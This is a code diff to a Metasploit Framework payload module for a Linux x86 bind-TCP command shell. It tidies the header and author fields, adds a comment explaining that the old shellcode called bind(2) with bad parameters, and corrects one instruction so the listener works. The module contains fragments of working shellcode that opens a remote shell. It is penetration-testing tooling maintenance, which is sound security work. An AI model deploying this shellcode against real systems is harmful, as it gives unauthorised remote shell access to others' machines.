@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -23,9 +19,8 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Linux Command Shell, Bind TCP Inline',
-			'Version'       => '$Revision$',
 			'Description'   => 'Listen for a connection and spawn a command shell',
-			'Author'        => 'ramon',
+			'Author'        => 'Ramon de C Valle',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'linux',
 			'Arch'          => ARCH_X86,
@@ -37,6 +32,13 @@ module Metasploit3
 						{
 							'LPORT'    => [ 21, 'n' ],
 						},
+					# TODO: Payload source needs serious cleanup. This payload was
+					# originally generated from
+					# external/source/unixasm/lin-x86-bndsockcode.s which supposedly
+					# worked when it was initially committed. Nevertheless, it was
+					# calling bind(2) with insane parameters, which ended up erroring out
+					# and causing execution to fall off the end of the shellcode,
+					# bursting into flames. See #7216, #7224
 					'Payload' =>
 						"\x31\xdb"             +#   xorl    %ebx,%ebx                  #
 						"\xf7\xe3"             +#   mull    %ebx                       #
@@ -50,7 +52,7 @@ module Metasploit3
 						"\x5b"                 +#   popl    %ebx                       #
 						"\x5e"                 +#   popl    %esi                       #
 						"\x52"                 +#   pushl   %edx                       #
-						"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
+						"\x68\x02\x00\x04\xd2" +#   pushl   $0xd2040200                #
 						"\x6a\x10"             +#   pushl   $0x10                      #
 						"\x51"                 +#   pushl   %ecx                       #
 						"\x50"                 +#   pushl   %eax                       #
